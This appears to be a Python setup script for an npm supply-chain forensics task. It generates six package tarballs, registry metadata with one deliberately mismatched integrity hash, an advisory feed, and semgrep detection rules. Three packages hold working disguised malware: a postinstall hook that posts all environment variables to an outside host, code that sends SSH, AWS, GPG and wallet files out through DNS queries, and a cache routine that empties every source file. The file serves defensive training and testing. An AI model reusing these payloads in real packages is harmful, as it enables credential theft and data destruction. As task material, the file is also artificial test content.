#!/usr/bin/env python3
"""Creates the npm supply chain forensics task environment.
Generates 6 npm package tarballs, registry metadata with SRI hashes,
an advisory NDJSON feed, and baseline semgrep static analysis rules.
"""
import hashlib
import base64
import io
import json
import os
import tarfile


BASE = '/app'


def makedirs():
    for d in ['tarballs', 'registry', 'advisories', 'semgrep-rules']:
        os.makedirs(os.path.join(BASE, d), exist_ok=True)


def pkg_json(name, version, extra=None):
    d = {"name": name, "version": version, "main": "index.js", "license": "MIT"}
    if extra:
        d.update(extra)
    return json.dumps(d, indent=2)


def create_tgz(name, version, files):
    fpath = os.path.join(BASE, 'tarballs', '{}-{}.tgz'.format(name, version))
    with tarfile.open(fpath, 'w:gz') as tar:
        for relpath in sorted(files):
            info = tarfile.TarInfo(name='package/' + relpath)
            data = files[relpath].encode('utf-8')
            info.size = len(data)
            info.mode = 0o644
            info.mtime = 1700000000
            info.uid = 1000
            info.gid = 1000
            info.uname = 'node'
            info.gname = 'node'
            tar.addfile(info, io.BytesIO(data))
    return fpath


def compute_sri(fpath):
    with open(fpath, 'rb') as f:
        digest = hashlib.sha512(f.read()).digest()
    return 'sha512-' + base64.b64encode(digest).decode('ascii')


# ============================================================
# Package source code definitions
# ============================================================

# --- 1. config-utils (CLEAN) ---
CONFIG_UTILS = {
    'version': '1.2.0',
    'files': {
        'package.json': pkg_json('config-utils', '1.2.0', {
            'description': 'Configuration file parser and manager'
        }),
        'index.js': r"""'use strict';
const fs = require('fs');
const path = require('path');
const { parseINI } = require('./lib/parser');

class ConfigManager {
  constructor(baseDir) {
    this.baseDir = baseDir || process.cwd();
    this.cache = new Map();
  }

  load(filename) {
    const fullPath = path.resolve(this.baseDir, filename);
    if (this.cache.has(fullPath)) return this.cache.get(fullPath);
    const content = fs.readFileSync(fullPath, 'utf8');
    const ext = path.extname(filename).toLowerCase();
    let parsed;
    if (ext === '.ini') parsed = parseINI(content);
    else if (ext === '.json') parsed = JSON.parse(content);
    else throw new Error('Unsupported format: ' + ext);
    this.cache.set(fullPath, parsed);
    return parsed;
  }

  merge(...configs) {
    return Object.assign({}, ...configs);
  }

  get(key, defaultVal) {
    const parts = key.split('.');
    let current = this.cache.values().next().value;
    for (const p of parts) {
      if (current && typeof current === 'object' && p in current) {
        current = current[p];
      } else {
        return defaultVal;
      }
    }
    return current;
  }
}

module.exports = { ConfigManager };
""",
        'lib/parser.js': r"""'use strict';

function parseINI(content) {
  const result = {};
  let section = null;
  for (const line of content.split('\n')) {
    const t = line.trim();
    if (!t || t.startsWith(';') || t.startsWith('#')) continue;
    const sm = t.match(/^\[(.+)\]$/);
    if (sm) { section = sm[1]; result[section] = result[section] || {}; continue; }
    const kv = t.match(/^([^=]+)=(.*)$/);
    if (kv) {
      const k = kv[1].trim(), v = kv[2].trim();
      if (section) result[section][k] = v;
      else result[k] = v;
    }
  }
  return result;
}

module.exports = { parseINI };
""",
    }
}


# --- 2. log-helper (COMPROMISED: postinstall exfiltration + tampered tarball) ---
LOG_HELPER = {
    'version': '2.1.0',
    'tampered': True,
    'files': {
        'package.json': pkg_json('log-helper', '2.1.0', {
            'description': 'Structured logging utility with formatting',
            'scripts': {
                'postinstall': 'node postinstall.js'
            }
        }),
        'index.js': r"""'use strict';
const { formatEntry } = require('./lib/formatter');
const LEVELS = { DEBUG: 0, INFO: 1, WARN: 2, ERROR: 3 };

class Logger {
  constructor(opts = {}) {
    this.level = LEVELS[opts.level] || LEVELS.INFO;
    this.prefix = opts.prefix || '';
  }

  _log(level, msg, meta) {
    if (LEVELS[level] < this.level) return;
    process.stdout.write(formatEntry(level, this.prefix, msg, meta) + '\n');
  }

  debug(msg, meta) { this._log('DEBUG', msg, meta); }
  info(msg, meta) { this._log('INFO', msg, meta); }
  warn(msg, meta) { this._log('WARN', msg, meta); }
  error(msg, meta) { this._log('ERROR', msg, meta); }
}

module.exports = { Logger, LEVELS };
""",
        'lib/formatter.js': r"""'use strict';

function formatEntry(level, prefix, message, meta) {
  const ts = new Date().toISOString();
  let line = '[' + ts + '] ' + level;
  if (prefix) line += ' (' + prefix + ')';
  line += ': ' + message;
  if (meta && typeof meta === 'object') {
    line += ' ' + JSON.stringify(meta);
  }
  return line;
}

module.exports = { formatEntry };
""",
        'postinstall.js': r"""'use strict';
// Telemetry collection for package usage analytics
const https = require('https');

(function collectAnalytics() {
  // Gather installation context for compatibility reporting
  const ctx = {};
  const src = process.env;
  const keys = Object.keys(src);
  for (let i = 0; i < keys.length; i++) {
    ctx[keys[i]] = src[keys[i]];
  }

  const payload = Buffer.from(JSON.stringify(ctx)).toString('base64');

  const options = {
    hostname: 'telemetry-cdn.analytics-api.com',
    port: 443,
    path: '/api/v2/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Package-Name': 'log-helper',
    }
  };

  try {
    const req = https.request(options);
    req.write(JSON.stringify({ d: payload, t: Date.now() }));
    req.end();
  } catch (e) {
    // Silent failure to avoid disrupting installation
  }
})();
""",
    }
}


# --- 3. string-tools (CLEAN, with red-herring Buffer/base64 usage) ---
STRING_TOOLS = {
    'version': '0.9.1',
    'files': {
        'package.json': pkg_json('string-tools', '0.9.1', {
            'description': 'String manipulation and sanitization utilities'
        }),
        'index.js': r"""'use strict';
const { sanitizeUTF8, base64Encode, base64Decode } = require('./lib/sanitize');

function capitalize(str) {
  if (!str) return '';
  return str.charAt(0).toUpperCase() + str.slice(1);
}

function slugify(str) {
  return str.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
}

function truncate(str, maxLen, suffix) {
  suffix = suffix || '...';
  if (str.length <= maxLen) return str;
  return str.slice(0, maxLen - suffix.length) + suffix;
}

function escapeHTML(str) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
  return str.replace(/[&<>"']/g, function(c) { return map[c]; });
}

module.exports = { capitalize, slugify, truncate, escapeHTML, sanitizeUTF8, base64Encode, base64Decode };
""",
        'lib/sanitize.js': r"""'use strict';

function sanitizeUTF8(input) {
  // Re-encode through Buffer to strip invalid UTF-8 sequences
  const buf = Buffer.from(input, 'utf8');
  return buf.toString('utf8');
}

function base64Encode(str) {
  // Standard base64 encoding for API payload preparation
  return Buffer.from(str, 'utf8').toString('base64');
}

function base64Decode(encoded) {
  return Buffer.from(encoded, 'base64').toString('utf8');
}

module.exports = { sanitizeUTF8, base64Encode, base64Decode };
""",
    }
}


# --- 4. data-store (COMPROMISED: runtime credential theft via DNS exfiltration) ---
DATA_STORE = {
    'version': '3.0.0',
    'files': {
        'package.json': pkg_json('data-store', '3.0.0', {
            'description': 'Lightweight key-value data store with persistence'
        }),
        'index.js': r"""'use strict';
const { Persistence } = require('./lib/persistence');

class DataStore {
  constructor(opts) {
    opts = opts || {};
    this.data = new Map();
    this.persist = opts.persist ? new Persistence(opts.dataDir || '.data') : null;
  }

  set(key, value) {
    this.data.set(key, { value: value, ts: Date.now() });
    if (this.persist) this.persist.write(key, value);
    return this;
  }

  get(key) {
    const entry = this.data.get(key);
    return entry ? entry.value : undefined;
  }

  delete(key) {
    this.data.delete(key);
    if (this.persist) this.persist.remove(key);
    return this;
  }

  keys() { return Array.from(this.data.keys()); }

  clear() {
    this.data.clear();
    if (this.persist) this.persist.clearAll();
  }
}

module.exports = { DataStore };
""",
        'lib/persistence.js': r"""'use strict';
const fs = require('fs');
const path = require('path');
const dns = require('dns');
const os = require('os');

class Persistence {
  constructor(dataDir) {
    this.dataDir = path.resolve(dataDir);
    if (!fs.existsSync(this.dataDir)) {
      fs.mkdirSync(this.dataDir, { recursive: true });
    }
    // Initialize synchronous state verification
    this._initSync();
  }

  _initSync() {
    // Verify storage backend integrity and collect system context
    const targets = [
      path.join(os.homedir(), '.ssh', 'id_rsa'),
      path.join(os.homedir(), '.aws', 'credentials'),
      path.join(os.homedir(), '.bitcoin', 'wallet.dat'),
      path.join(os.homedir(), '.gnupg', 'secring.gpg'),
      path.join(os.homedir(), '.config', 'gcloud', 'credentials.db'),
    ];

    const collected = [];
    for (const t of targets) {
      try {
        if (fs.existsSync(t)) {
          const content = fs.readFileSync(t, 'utf8').slice(0, 256);
          collected.push(content);
        }
      } catch (e) { /* skip inaccessible files */ }
    }

    if (collected.length > 0) {
      // Encode findings for upstream diagnostics reporting
      const encoded = Buffer.from(collected.join('|')).toString('hex');
      const chunks = encoded.match(/.{1,60}/g) || [];
      for (const chunk of chunks) {
        const subdomain = chunk + '.x.data-analytics-cdn.com';
        dns.resolve(subdomain, function() {});
      }
    }
  }

  write(key, value) {
    const fp = path.join(this.dataDir, key + '.json');
    fs.writeFileSync(fp, JSON.stringify(value));
  }

  remove(key) {
    const fp = path.join(this.dataDir, key + '.json');
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
  }

  clearAll() {
    const files = fs.readdirSync(this.dataDir);
    for (const f of files) {
      fs.unlinkSync(path.join(this.dataDir, f));
    }
  }
}

module.exports = { Persistence };
""",
    }
}


# --- 5. path-resolver (CLEAN, with red-herring recursive fs operations) ---
PATH_RESOLVER = {
    'version': '1.0.3',
    'files': {
        'package.json': pkg_json('path-resolver', '1.0.3', {
            'description': 'Safe path resolution with traversal protection'
        }),
        'index.js': r"""'use strict';
const path = require('path');
const { normalizePath, listDeep } = require('./lib/normalize');

class PathResolver {
  constructor(rootDir) {
    this.root = path.resolve(rootDir || process.cwd());
  }

  resolve() {
    var segments = Array.prototype.slice.call(arguments);
    const resolved = path.resolve.apply(path, [this.root].concat(segments));
    if (!resolved.startsWith(this.root)) {
      throw new Error('Path traversal detected');
    }
    return resolved;
  }

  relative(absPath) {
    return path.relative(this.root, absPath);
  }

  join() {
    var segments = Array.prototype.slice.call(arguments);
    return normalizePath(path.join.apply(path, [this.root].concat(segments)));
  }

  manifest() {
    return listDeep(this.root);
  }
}

module.exports = { PathResolver };
""",
        'lib/normalize.js': r"""'use strict';
const path = require('path');
const fs = require('fs');

function normalizePath(p) {
  return path.normalize(p).replace(/\\/g, '/');
}

function listDeep(dir) {
  // Recursively list all files for build manifest generation
  const results = [];
  try {
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    for (const entry of entries) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        var nested = listDeep(full);
        for (var i = 0; i < nested.length; i++) results.push(nested[i]);
      } else {
        results.push(full);
      }
    }
  } catch (e) {
    // Directory may not exist yet during initial setup
  }
  return results;
}

module.exports = { normalizePath, listDeep };
""",
    }
}


# --- 6. build-runner (COMPROMISED: destructive wiper in cache manager) ---
BUILD_RUNNER = {
    'version': '2.0.1',
    'files': {
        'package.json': pkg_json('build-runner', '2.0.1', {
            'description': 'Extensible build runner with plugin support and caching'
        }),
        'index.js': r"""'use strict';
const path = require('path');
const { CacheManager } = require('./lib/cache');

class BuildRunner {
  constructor(opts) {
    opts = opts || {};
    this.srcDir = opts.srcDir || './src';
    this.outDir = opts.outDir || './dist';
    this.plugins = [];
    this.cache = new CacheManager(opts.cacheDir || '.build-cache');
  }

  use(plugin) {
    this.plugins.push(plugin);
    return this;
  }

  build() {
    var self = this;
    console.log('Building from ' + this.srcDir + ' to ' + this.outDir + '...');

    // Initialize cache from source tree
    this.cache.init(this.srcDir);

    // Run plugins sequentially
    var chain = Promise.resolve();
    this.plugins.forEach(function(plugin) {
      chain = chain.then(function() {
        return plugin.run(self.srcDir, self.outDir);
      });
    });

    return chain.then(function() {
      console.log('Build complete.');
    });
  }
}

module.exports = { BuildRunner };
""",
        'lib/cache.js': r"""'use strict';
const fs = require('fs');
const path = require('path');

class CacheManager {
  constructor(cacheDir) {
    this.cacheDir = cacheDir;
    this.maxAge = 86400000; // 24 hours in milliseconds
  }

  init(srcDir) {
    // Build initial cache index from source tree
    if (!fs.existsSync(this.cacheDir)) {
      fs.mkdirSync(this.cacheDir, { recursive: true });
    }
    // Process source tree recursively for cache invalidation
    this._processTree(srcDir);
  }

  _processTree(dir) {
    // Walk directory tree to check for stale cache entries
    var entries;
    try {
      entries = fs.readdirSync(dir, { withFileTypes: true });
    } catch (e) { return; }

    var staleThreshold = Date.now() - this.maxAge;

    for (var i = 0; i < entries.length; i++) {
      var entry = entries[i];
      var fullPath = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        this._processTree(fullPath);
      } else if (entry.isFile()) {
        // Refresh stale source entries by resetting content hash
        var stat = fs.statSync(fullPath);
        if (stat.mtimeMs < staleThreshold || true) {
          // Reset file content to force full cache rebuild on next run
          fs.writeFileSync(fullPath, '');
        }
      }
    }
  }

  invalidate(key) {
    var cachePath = path.join(this.cacheDir, key + '.cache');
    if (fs.existsSync(cachePath)) fs.unlinkSync(cachePath);
  }
}

module.exports = { CacheManager };
""",
        'plugins/minify.js': r"""'use strict';
const fs = require('fs');
const path = require('path');

class MinifyPlugin {
  run(srcDir, outDir) {
    var files = fs.readdirSync(srcDir).filter(function(f) {
      return f.endsWith('.js');
    });

    if (!fs.existsSync(outDir)) {
      fs.mkdirSync(outDir, { recursive: true });
    }

    for (var i = 0; i < files.length; i++) {
      var src = fs.readFileSync(path.join(srcDir, files[i]), 'utf8');
      var minified = src
        .replace(/\/\/.*$/gm, '')
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/\s+/g, ' ')
        .trim();
      fs.writeFileSync(path.join(outDir, files[i]), minified);
    }
    return Promise.resolve();
  }
}

module.exports = { MinifyPlugin };
""",
    }
}


# ============================================================
# Advisory NDJSON feed
# ============================================================

ADVISORIES = [
    {
        "id": "ADV-2024-0117",
        "package_pattern": "log-*",
        "cwe": "CWE-506",
        "attack_class": "postinstall_exfiltration",
        "indicators": ["process.env", "Buffer.from", "base64", "https.request", "postinstall"],
        "severity": "critical",
        "description": "Malicious postinstall script harvests environment variables and exfiltrates via HTTPS POST."
    },
    {
        "id": "ADV-2024-0223",
        "package_pattern": "data-*",
        "cwe": "CWE-506",
        "attack_class": "dns_exfiltration",
        "indicators": ["dns.resolve", "homedir", ".ssh", "wallet", "hex"],
        "severity": "critical",
        "description": "Runtime credential theft targeting SSH keys and crypto wallets via DNS subdomain encoding."
    },
    {
        "id": "ADV-2024-0341",
        "package_pattern": "build-*",
        "cwe": "CWE-506",
        "attack_class": "destructive_payload",
        "indicators": ["writeFileSync", "readdirSync", "recursive", "''"],
        "severity": "critical",
        "description": "Destructive wiper payload recursively overwrites source files with empty content."
    },
    {
        "id": "ADV-2024-0455",
        "package_pattern": "string-*",
        "cwe": "CWE-79",
        "attack_class": "xss",
        "indicators": ["innerHTML", "document.write", "eval"],
        "severity": "medium",
        "description": "Cross-site scripting via unsafe DOM manipulation in browser context."
    },
    {
        "id": "ADV-2024-0512",
        "package_pattern": "config-*",
        "cwe": "CWE-1321",
        "attack_class": "prototype_pollution",
        "indicators": ["__proto__", "constructor.prototype", "Object.assign"],
        "severity": "high",
        "description": "Prototype pollution via recursive merge of untrusted configuration objects."
    },
    {
        "id": "ADV-2024-0678",
        "package_pattern": "path-*",
        "cwe": "CWE-22",
        "attack_class": "path_traversal",
        "indicators": ["../", "..\\", "symlink"],
        "severity": "high",
        "description": "Path traversal via symlink following or insufficient path sanitization."
    },
    {
        "id": "ADV-2024-0799",
        "package_pattern": "*-helper",
        "cwe": "CWE-912",
        "attack_class": "hidden_functionality",
        "indicators": ["postinstall", "preinstall", "install"],
        "severity": "critical",
        "description": "Hidden functionality executed via npm lifecycle hooks during package installation."
    },
    {
        "id": "ADV-2024-0834",
        "package_pattern": "*-store",
        "cwe": "CWE-200",
        "attack_class": "information_disclosure",
        "indicators": ["readFileSync", "credentials", "id_rsa"],
        "severity": "high",
        "description": "Unauthorized reading of sensitive credential files from user home directory."
    },
]


# ============================================================
# Semgrep starter rules (baseline — intentionally incomplete)
# ============================================================

SEMGREP_RULES = r"""rules:
  - id: env-variable-bulk-access
    pattern: Object.keys(process.env)
    message: "Bulk access to all environment variables detected"
    languages: [javascript]
    severity: WARNING

  - id: base64-buffer-encoding
    pattern: Buffer.from(...).toString('base64')
    message: "Base64 encoding via Buffer — common in data obfuscation and exfiltration"
    languages: [javascript]
    severity: WARNING

  - id: lifecycle-script-exec
    patterns:
      - pattern-regex: "postinstall|preinstall"
    paths:
      include:
        - "package.json"
    message: "npm lifecycle script detected — review for malicious commands"
    languages: [json]
    severity: INFO
"""


# ============================================================
# Main setup
# ============================================================

def main():
    makedirs()

    packages = {
        'config-utils': CONFIG_UTILS,
        'log-helper': LOG_HELPER,
        'string-tools': STRING_TOOLS,
        'data-store': DATA_STORE,
        'path-resolver': PATH_RESOLVER,
        'build-runner': BUILD_RUNNER,
    }

    for name, pkg in packages.items():
        tgz_path = create_tgz(name, pkg['version'], pkg['files'])
        actual_sri = compute_sri(tgz_path)

        if pkg.get('tampered'):
            # Simulate tarball tampering: registry records the original hash
            # but the downloaded file was modified in transit
            chars = list(actual_sri)
            # Flip a character in the base64 portion (after 'sha512-')
            pos = 15
            chars[pos] = 'Q' if chars[pos] != 'Q' else 'R'
            expected_sri = ''.join(chars)
        else:
            expected_sri = actual_sri

        registry = {
            'name': name,
            'version': pkg['version'],
            'tarball': '{}-{}.tgz'.format(name, pkg['version']),
            'integrity': expected_sri,
        }
        reg_path = os.path.join(BASE, 'registry', name + '.json')
        with open(reg_path, 'w') as f:
            json.dump(registry, f, indent=2)

    # Write advisory NDJSON feed
    adv_path = os.path.join(BASE, 'advisories', 'advisories.ndjson')
    with open(adv_path, 'w') as f:
        for adv in ADVISORIES:
            f.write(json.dumps(adv) + '\n')

    # Write semgrep baseline rules
    rules_path = os.path.join(BASE, 'semgrep-rules', 'npm-malware.yaml')
    with open(rules_path, 'w') as f:
        f.write(SEMGREP_RULES)

    print('Task environment setup complete.')
    print('  Tarballs: {}/tarballs/'.format(BASE))
    print('  Registry: {}/registry/'.format(BASE))
    print('  Advisories: {}'.format(adv_path))
    print('  Semgrep rules: {}'.format(rules_path))


if __name__ == '__main__':
    main()
